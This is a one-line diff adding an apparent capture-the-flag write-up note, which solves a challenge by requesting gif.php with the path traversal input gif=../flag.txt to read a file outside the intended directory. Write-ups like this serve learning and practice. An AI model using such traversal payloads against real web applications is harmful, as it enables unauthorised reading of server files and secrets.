@@ -1,0 +1,1 @@
+Simple path traversal problem, request `http://web2015.icec.tf/giffy/gif.php?gif=../flag.txt`.
